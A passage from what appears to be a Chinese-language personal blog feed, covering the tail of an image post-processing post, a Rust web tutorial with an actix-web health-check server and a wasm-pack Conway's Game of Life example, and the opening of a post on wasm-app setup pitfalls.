保存处理后的图像</span></span><br><span class="line">save_image_grid(processed_images, <span class="string">&#x27;generated_images_processed.png&#x27;</span>, <span class="string">&#x27;processed generated images&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;已保存原始图像到 generated_images_raw.png&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;已保存处理后图像到 generated_images_processed.png&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可选：创建对比图</span></span><br><span class="line">fig, axes = plt.subplots(<span class="number">2</span>, <span class="number">1</span>, figsize=(<span class="number">8</span>, <span class="number">16</span>))</span><br><span class="line">axes[<span class="number">0</span>].imshow(utils.make_grid(generated_images, nrow=<span class="number">4</span>).permute(<span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>), cmap=<span class="string">&#x27;gray&#x27;</span>)</span><br><span class="line">axes[<span class="number">0</span>].set_title(<span class="string">&#x27;before post-processing&#x27;</span>)</span><br><span class="line">axes[<span class="number">0</span>].axis(<span class="string">&#x27;off&#x27;</span>)</span><br><span class="line"></span><br><span class="line">axes[<span class="number">1</span>].imshow(utils.make_grid(processed_images, nrow=<span class="number">4</span>).permute(<span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>), cmap=<span class="string">&#x27;gray&#x27;</span>)</span><br><span class="line">axes[<span class="number">1</span>].set_title(<span class="string">&#x27;after post-processing&#x27;</span>)</span><br><span class="line">axes[<span class="number">1</span>].axis(<span class="string">&#x27;off&#x27;</span>)</span><br><span class="line"></span><br><span class="line">plt.savefig(<span class="string">&#x27;comparison.png&#x27;</span>, dpi=<span class="number">300</span>, bbox_inches=<span class="string">&#x27;tight&#x27;</span>)</span><br><span class="line">plt.close()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;已保存对比图到 comparison.png&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>具体解释待补充…</p>
]]></content>
      <tags>
        <tag>science</tag>
      </tags>
  </entry>
  <entry>
    <title>rust-web</title>
    <url>/2025/03/29/rust-web/</url>
    <content><![CDATA[<h2 id="Rust-Web"><a href="#Rust-Web" class="headerlink" title="Rust Web"></a>Rust Web</h2><p>最近在学习 Rust，试着用 Rust 开发 Web 应用程序。</p>
<h3 id="1-Rust-Web-Frameworks"><a href="#1-Rust-Web-Frameworks" class="headerlink" title="1. Rust Web Frameworks"></a>1. Rust Web Frameworks</h3><p>使用 Rust 开发 Web 应用程序的框架有很多，以下是一些流行的选择：</p>
<ul>
<li><p><a href="https://actix.rs/">actix-web</a></p>
</li>
<li><p><a href="https://docs.rs/axum/latest/axum/">axum</a></p>
</li>
</ul>
<p>…</p>
<h3 id="example"><a href="#example" class="headerlink" title="example"></a>example</h3><p>使用<code>actix-web</code> 框架创建一个简单的 Web 服务。</p>
<figure class="highlight toml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Cargo.toml</span></span><br><span class="line"><span class="section">[package]</span></span><br><span class="line"><span class="attr">name</span> = <span class="string">&quot;webservice&quot;</span></span><br><span class="line"><span class="attr">version</span> = <span class="string">&quot;0.1.0&quot;</span></span><br><span class="line"><span class="attr">edition</span> = <span class="string">&quot;2024&quot;</span></span><br><span class="line"><span class="attr">default-run</span> = <span class="string">&quot;teacher-service&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="section">[dependencies]</span></span><br><span class="line"><span class="attr">actix-web</span> = <span class="string">&quot;4.0.0-beta.1&quot;</span></span><br><span class="line"><span class="attr">actix-rt</span> = <span class="string">&quot;2.5.0&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="section">[[bin]]</span></span><br><span class="line"><span class="attr">name</span> = <span class="string">&quot;server1&quot;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="comment">// src/bin/server1.rs</span></span><br><span class="line"><span class="keyword">use</span> actix_web::&#123;web, App, HttpResponse, HttpServer, Responder&#125;;</span><br><span class="line"><span class="keyword">use</span> std::io;</span><br><span class="line"></span><br><span class="line"><span class="comment">// route configuration</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">general_routes</span>(cfg: &amp;<span class="keyword">mut</span> web::ServiceConfig) &#123;</span><br><span class="line">    cfg.<span class="title function_ invoke__">route</span>(<span class="string">&quot;/health&quot;</span>, web::<span class="title function_ invoke__">get</span>().<span class="title function_ invoke__">to</span>(health_check_handler));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// handler configuration</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">health_check_handler</span>() <span class="punctuation">-&gt;</span> <span class="keyword">impl</span> <span class="title class_">Responder</span> &#123;</span><br><span class="line">    HttpResponse::<span class="title function_ invoke__">Ok</span>().<span class="title function_ invoke__">json</span>(<span class="string">&quot;Acitx Web Service is running&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// run HTTP server</span></span><br><span class="line"><span class="meta">#[actix_rt::main]</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">main</span>() <span class="punctuation">-&gt;</span> io::<span class="type">Result</span>&lt;()&gt; &#123;</span><br><span class="line">    <span class="comment">// build app and configure routes</span></span><br><span class="line">    <span class="comment">// factory function, multiple instances of the app can be created</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">app</span> = <span class="keyword">move</span> || &#123;</span><br><span class="line">        App::<span class="title function_ invoke__">new</span>().<span class="title function_ invoke__">configure</span>(general_routes)</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// start the server</span></span><br><span class="line">    HttpServer::<span class="title function_ invoke__">new</span>(app).<span class="title function_ invoke__">bind</span>(<span class="string">&quot;127.0.0.1:3000&quot;</span>)?</span><br><span class="line">        .<span class="title function_ invoke__">run</span>()</span><br><span class="line">        .<span class="keyword">await</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>访问<code>localhost:3000/health</code>，返回<code>&quot;Acitx Web Service is running&quot;</code>。</p>
<h3 id="2-Rust-WebAssembly"><a href="#2-Rust-WebAssembly" class="headerlink" title="2. Rust WebAssembly"></a>2. Rust WebAssembly</h3><p>通过浏览<a href="https://rustwasm.github.io/docs/book/game-of-life/hello-world.html">rustwasm</a>可以了解如何使用 Rust 开发 WebAssembly 应用程序。</p>
<h3 id="small-example"><a href="#small-example" class="headerlink" title="small example"></a>small example</h3><p>使用<code>wasm-pack</code>创建一个简单的 WebAssembly 应用程序。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wasm-pack new wasm-test</span><br></pre></td></tr></table></figure>

<p>然后在<code>wasm-test</code>目录下运行以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wasm-pack build</span><br></pre></td></tr></table></figure>

<p>这将创建一个<code>pkg</code>目录，其中包含编译后的 WebAssembly 模块和 JavaScript 绑定。</p>
<p>然后在<code>wasm-test</code>目录下运行以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm init wasm-app www</span><br></pre></td></tr></table></figure>

<p>这将创建一个新的 Web 应用程序，并在<code>www</code>目录下创建一个<code>package.json</code>文件。</p>
<p>然后在<code>www</code>目录下运行以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install</span><br></pre></td></tr></table></figure>

<p>这将安装所有依赖项。</p>
<p>然后在<code>www</code>目录下运行以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm run start</span><br></pre></td></tr></table></figure>

<p>访问<code>localhost:8080</code>，可以看到一个简单的 Web 应用程序。</p>
<p>p.s. 如果遇到问题，可以查看另一篇博客<a href="https://xudong7.github.io/2025/03/31/wasm-app-%E8%B8%A9%E5%9D%91/">wasm-app 踩坑</a>。</p>
<h3 id="Conway’s-Game-of-Life"><a href="#Conway’s-Game-of-Life" class="headerlink" title="Conway’s Game of Life"></a>Conway’s Game of Life</h3><p>进入<code>wasm-test</code>目录，修改<code>src/lib.rs</code>文件，去掉默认的<code>greet</code>函数，添加以下代码：</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="meta">#[wasm_bindgen]</span></span><br><span class="line"><span class="meta">#[repr(u8)]</span></span><br><span class="line"><span class="meta">#[derive(Clone, Copy, Debug, PartialEq, Eq)]</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">enum</span> <span class="title class_">Cell</span> &#123;</span><br><span class="line">    Dead = <span class="number">0</span>,</span><br><span class="line">    Alive = <span class="number">1</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[wasm_bindgen]</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">struct</span> <span class="title class_">Universe</span> &#123;</span><br><span class="line">    width: <span class="type">u32</span>,</span><br><span class="line">    height: <span class="type">u32</span>,</span><br><span class="line">    cells: <span class="type">Vec</span>&lt;Cell&gt;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">Universe</span> &#123;</span><br><span class="line">    <span class="comment">// two-dimensional index to one-dimensional index</span></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">get_index</span>(&amp;<span class="keyword">self</span>, row: <span class="type">u32</span>, column: <span class="type">u32</span>) <span class="punctuation">-&gt;</span> <span class="type">usize</span> &#123;</span><br><span class="line">        (row * <span class="keyword">self</span>.width + column) <span class="keyword">as</span> <span class="type">usize</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// compute count of live cells around a cell</span></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">live_neighbor_count</span>(&amp;<span class="keyword">self</span>, row: <span class="type">u32</span>, column: <span class="type">u32</span>) <span class="punctuation">-&gt;</span> <span class="type">u8</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">count</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> <span class="variable">delta_row</span> <span class="keyword">in</span> [<span class="keyword">self</span>.height - <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>].<span class="title function_ invoke__">iter</span>().<span class="title function_ invoke__">cloned</span>() &#123;</span><br><span class="line">            <span class="keyword">for</span> <span class="variable">delta_col</span> <span class="keyword">in</span> [<span class="keyword">self</span>.width - <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>].<span class="title function_ invoke__">iter</span>().<span class="title function_ invoke__">cloned</span>() &#123;</span><br><span class="line">                <span class="keyword">if</span> delta_row == <span class="number">0</span> &amp;&amp; delta_col == <span class="number">0</span> &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">let</span> <span class="variable">neighbor_row</span> = (row + delta_row) % <span class="keyword">self</span>.height;</span><br><span class="line">                <span class="keyword">let</span> <span class="variable">neighbor_col</span> = (column + delta_col) % <span class="keyword">self</span>.width;</span><br><span class="line">                <span class="keyword">let</span> <span class="variable">idx</span> = <span class="keyword">self</span>.<span class="title function_ invoke__">get_index</span>(neighbor_row, neighbor_col);</span><br><span class="line">                count += <span class="keyword">self</span>.cells[idx] <span class="keyword">as</span> <span class="type">u8</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        count</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[wasm_bindgen]</span></span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">Universe</span> &#123;</span><br><span class="line">    <span class="comment">// game frame</span></span><br><span class="line">    <span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">tick</span>(&amp;<span class="keyword">mut</span> <span class="keyword">self</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">next</span> = <span class="keyword">self</span>.cells.<span class="title function_ invoke__">clone</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> <span class="variable">row</span> <span class="keyword">in</span> <span class="number">0</span>..<span class="keyword">self</span>.height &#123;</span><br><span class="line">            <span class="keyword">for</span> <span class="variable">col</span> <span class="keyword">in</span> <span class="number">0</span>..<span class="keyword">self</span>.width &#123;</span><br><span class="line">                <span class="keyword">let</span> <span class="variable">idx</span> = <span class="keyword">self</span>.<span class="title function_ invoke__">get_index</span>(row, col);</span><br><span class="line">                <span class="keyword">let</span> <span class="variable">cell</span> = <span class="keyword">self</span>.cells[idx];</span><br><span class="line">                <span class="keyword">let</span> <span class="variable">live_neighbors</span> = <span class="keyword">self</span>.<span class="title function_ invoke__">live_neighbor_count</span>(row, col);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">let</span> <span class="variable">next_cell</span> = <span class="keyword">match</span> (cell, live_neighbors) &#123;</span><br><span class="line">                    <span class="comment">// rule 1: dead if less than 2 neighbors</span></span><br><span class="line">                    (Cell::Alive, x) <span class="keyword">if</span> x &lt; <span class="number">2</span> =&gt; Cell::Dead,</span><br><span class="line">                    <span class="comment">// rule 2: live if 2 or 3 neighbors</span></span><br><span class="line">                    (Cell::Alive, <span class="number">2</span>) | (Cell::Alive, <span class="number">3</span>) =&gt; Cell::Alive,</span><br><span class="line">                    <span class="comment">// rule 3: dead if more than 3 neighbors</span></span><br><span class="line">                    (Cell::Alive, x) <span class="keyword">if</span> x &gt; <span class="number">3</span> =&gt; Cell::Dead,</span><br><span class="line">                    <span class="comment">// rule 4: generate if exactly 3 neighbors when dead</span></span><br><span class="line">                    (Cell::Dead, <span class="number">3</span>) =&gt; Cell::Alive,</span><br><span class="line">                    <span class="comment">// otherwise: keep the same state</span></span><br><span class="line">                    (otherwise, _) =&gt; otherwise,</span><br><span class="line">                &#125;;</span><br><span class="line"></span><br><span class="line">                next[idx] = next_cell;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">self</span>.cells = next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// initialize the universe</span></span><br><span class="line">    <span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">new</span>() <span class="punctuation">-&gt;</span> Universe &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">width</span> = <span class="number">64</span>;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">height</span> = <span class="number">64</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> <span class="variable">cells</span> = (<span class="number">0</span>..width * height)</span><br><span class="line">            .<span class="title function_ invoke__">map</span>(|i| &#123;</span><br><span class="line">                <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span> || i % <span class="number">7</span> == <span class="number">0</span> &#123;</span><br><span class="line">                    Cell::Alive</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    Cell::Dead</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;)</span><br><span class="line">            .<span class="title function_ invoke__">collect</span>();</span><br><span class="line"></span><br><span class="line">        Universe &#123;</span><br><span class="line">            width,</span><br><span class="line">            height,</span><br><span class="line">            cells,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// render the universe</span></span><br><span class="line">    <span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">render</span>(&amp;<span class="keyword">self</span>) <span class="punctuation">-&gt;</span> <span class="type">String</span> &#123;</span><br><span class="line">        <span class="keyword">self</span>.<span class="title function_ invoke__">to_string</span>()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">width</span>(&amp;<span class="keyword">self</span>) <span class="punctuation">-&gt;</span> <span class="type">u32</span> &#123;</span><br><span class="line">        <span class="keyword">self</span>.width</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">height</span>(&amp;<span class="keyword">self</span>) <span class="punctuation">-&gt;</span> <span class="type">u32</span> &#123;</span><br><span class="line">        <span class="keyword">self</span>.height</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">cells</span>(&amp;<span class="keyword">self</span>) <span class="punctuation">-&gt;</span> *<span class="keyword">const</span> Cell &#123;</span><br><span class="line">        <span class="keyword">self</span>.cells.<span class="title function_ invoke__">as_ptr</span>()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> std::fmt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">fmt</span>::Display <span class="keyword">for</span> <span class="title class_">Universe</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">fmt</span>(&amp;<span class="keyword">self</span>, f: &amp;<span class="keyword">mut</span> fmt::Formatter) <span class="punctuation">-&gt;</span> fmt::<span class="type">Result</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> <span class="variable">line</span> <span class="keyword">in</span> <span class="keyword">self</span>.cells.<span class="title function_ invoke__">as_slice</span>().<span class="title function_ invoke__">chunks</span>(<span class="keyword">self</span>.width <span class="keyword">as</span> <span class="type">usize</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> &amp;cell <span class="keyword">in</span> line &#123;</span><br><span class="line">                <span class="keyword">let</span> <span class="variable">symbol</span> = <span class="keyword">if</span> cell == Cell::Dead &#123; <span class="string">&#x27;◻&#x27;</span> &#125; <span class="keyword">else</span> &#123; <span class="string">&#x27;◼&#x27;</span> &#125;;</span><br><span class="line">                <span class="built_in">write!</span>(f, <span class="string">&quot;&#123;&#125;&quot;</span>, symbol)?;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">write!</span>(f, <span class="string">&quot;\n&quot;</span>)?;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">Ok</span>(())</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以上代码实现了一个简单的<code>Conway&#39;s Game of Life</code>游戏逻辑</p>
<p>接着在<code>www</code>目录下的<code>index.js</code>中添加以下代码：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Universe</span>, <span class="title class_">Cell</span> &#125; <span class="keyword">from</span> <span class="string">&quot;wasm-test&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; memory &#125; <span class="keyword">from</span> <span class="string">&quot;wasm-test/wasm_test_bg.wasm&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">CELL_SIZE</span> = <span class="number">5</span>; <span class="comment">// px</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">GRID_COLOR</span> = <span class="string">&#x27;#CCCCCC&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">DEAD_COLOR</span> = <span class="string">&#x27;#FFFFFF&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">ALIVE_COLOR</span> = <span class="string">&#x27;#000000&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Construct the universe, and get its width and height.</span></span><br><span class="line"><span class="keyword">const</span> universe = <span class="title class_">Universe</span>.<span class="title function_">new</span>();</span><br><span class="line"><span class="keyword">const</span> width = universe.<span class="title function_">width</span>();</span><br><span class="line"><span class="keyword">const</span> height = universe.<span class="title function_">height</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Give the canvas room for all of our cells and a 1px border</span></span><br><span class="line"><span class="comment">// around each of them.</span></span><br><span class="line"><span class="keyword">const</span> canvas = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;game-of-life-canvas&quot;</span>);</span><br><span class="line">canvas.<span class="property">height</span> = (<span class="variable constant_">CELL_SIZE</span> + <span class="number">1</span>) * height + <span class="number">1</span>;</span><br><span class="line">canvas.<span class="property">width</span> = (<span class="variable constant_">CELL_SIZE</span> + <span class="number">1</span>) * width + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> ctx = canvas.<span class="title function_">getContext</span>(<span class="string">&#x27;2d&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">drawGrid</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    ctx.<span class="title function_">beginPath</span>();</span><br><span class="line">    ctx.<span class="property">lineWidth</span> = <span class="number">1</span> / <span class="variable language_">window</span>.<span class="property">devicePixelRatio</span>;</span><br><span class="line">    ctx.<span class="property">strokeStyle</span> = <span class="variable constant_">GRID_COLOR</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Vertical lines.</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt;= width; i++) &#123;</span><br><span class="line">        ctx.<span class="title function_">moveTo</span>(i * (<span class="variable constant_">CELL_SIZE</span> + <span class="number">1</span>) + <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">        ctx.<span class="title function_">lineTo</span>(i * (<span class="variable constant_">CELL_SIZE</span> + <span class="number">1</span>) + <span class="number">1</span>, (<span class="variable constant_">CELL_SIZE</span> + <span class="number">1</span>) * height + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Horizontal lines.</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt;= height; j++) &#123;</span><br><span class="line">        ctx.<span class="title function_">moveTo</span>(<span class="number">0</span>, j * (<span class="variable constant_">CELL_SIZE</span> + <span class="number">1</span>) + <span class="number">1</span>);</span><br><span class="line">        ctx.<span class="title function_">lineTo</span>((<span class="variable constant_">CELL_SIZE</span> + <span class="number">1</span>) * width + <span class="number">1</span>, j * (<span class="variable constant_">CELL_SIZE</span> + <span class="number">1</span>) + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ctx.<span class="title function_">stroke</span>();</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">getIndex</span> = (<span class="params">row, column</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> row * width + column;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">drawCells</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> cellsPtr = universe.<span class="title function_">cells</span>();</span><br><span class="line">    <span class="keyword">const</span> cells = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>(memory.<span class="property">buffer</span>, cellsPtr, width * height);</span><br><span class="line"></span><br><span class="line">    ctx.<span class="title function_">beginPath</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> row = <span class="number">0</span>; row &lt; height; row++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> col = <span class="number">0</span>; col &lt; width; col++) &#123;</span><br><span class="line">            <span class="keyword">const</span> idx = <span class="title function_">getIndex</span>(row, col);</span><br><span class="line"></span><br><span class="line">            ctx.<span class="property">fillStyle</span> = cells[idx] === <span class="title class_">Cell</span>.<span class="property">Dead</span></span><br><span class="line">                ? <span class="variable constant_">DEAD_COLOR</span></span><br><span class="line">                : <span class="variable constant_">ALIVE_COLOR</span>;</span><br><span class="line"></span><br><span class="line">            ctx.<span class="title function_">fillRect</span>(</span><br><span class="line">                col * (<span class="variable constant_">CELL_SIZE</span> + <span class="number">1</span>) + <span class="number">1</span>,</span><br><span class="line">                row * (<span class="variable constant_">CELL_SIZE</span> + <span class="number">1</span>) + <span class="number">1</span>,</span><br><span class="line">                <span class="variable constant_">CELL_SIZE</span>,</span><br><span class="line">                <span class="variable constant_">CELL_SIZE</span></span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ctx.<span class="title function_">stroke</span>();</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">renderLoop</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    universe.<span class="title function_">tick</span>();</span><br><span class="line"></span><br><span class="line">    <span class="title function_">drawGrid</span>();</span><br><span class="line">    <span class="title function_">drawCells</span>();</span><br><span class="line"></span><br><span class="line">    <span class="title function_">requestAnimationFrame</span>(renderLoop);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title function_">drawGrid</span>();</span><br><span class="line"><span class="title function_">drawCells</span>();</span><br><span class="line"><span class="title function_">requestAnimationFrame</span>(renderLoop);</span><br></pre></td></tr></table></figure>

<p>在<code>index.html</code>中添加以下代码：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Hello wasm-pack!<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="selector-tag">body</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">position</span>: absolute;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">top</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">left</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">height</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">display</span>: flex;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">flex-direction</span>: column;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">align-items</span>: center;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">justify-content</span>: center;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">noscript</span>&gt;</span>This page contains webassembly and javascript content, please enable javascript in your browser.<span class="tag">&lt;/<span class="name">noscript</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">canvas</span>  <span class="attr">id</span>=<span class="string">&quot;game-of-life-canvas&quot;</span>&gt;</span>&lt;/canvas &gt;</span><br><span class="line">      <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;./bootstrap.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;./bootstrap.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>以上两份代码实现了一个简单的<code>Conway&#39;s Game of Life</code>渲染逻辑和游戏循环。</p>
<p>回到<code>wasm-test</code>目录下，运行以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wasm-pack build</span><br></pre></td></tr></table></figure>

<p>再进入<code>www</code>目录下，运行以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm run start</span><br></pre></td></tr></table></figure>

<p>访问<code>localhost:8080</code>，可以看到一个简单的<code>Conway&#39;s Game of Life</code>游戏。</p>
<p><img src="/images/image27.png" alt="alt text"></p>
<h3 id="3-rustwasm-actix-web"><a href="#3-rustwasm-actix-web" class="headerlink" title="3. rustwasm + actix-web"></a>3. rustwasm + actix-web</h3><p>learning…</p>
]]></content>
      <tags>
        <tag>rust</tag>
      </tags>
  </entry>
  <entry>
    <title>wasm-app 踩坑</title>
    <url>/2025/03/31/wasm-app-%E8%B8%A9%E5%9D%91/</url>
    <content><![CDATA[<h1 id="wasm-app-踩坑"><a href="#wasm-app-踩坑" class="headerlink" title="wasm-app 踩坑"></a>wasm-app 踩坑</h1><p>最近使用 Rust 开发 Web 应用程序，尝试使用 <code>wasm-app</code> 模板创建一个简单的 Web 应用程序。</p>
<p>先使用<code>wasm-pack</code>创建一个新的 Rust 项目</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wasm-pack new wasm-test</span><br></pre></td></tr></table></figure>

<p>然后进入项目目录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> wasm-test</span><br></pre></td></tr></table></figure>

<p>接着使用<code>wasm-pack build</code>命令构建项目</p>
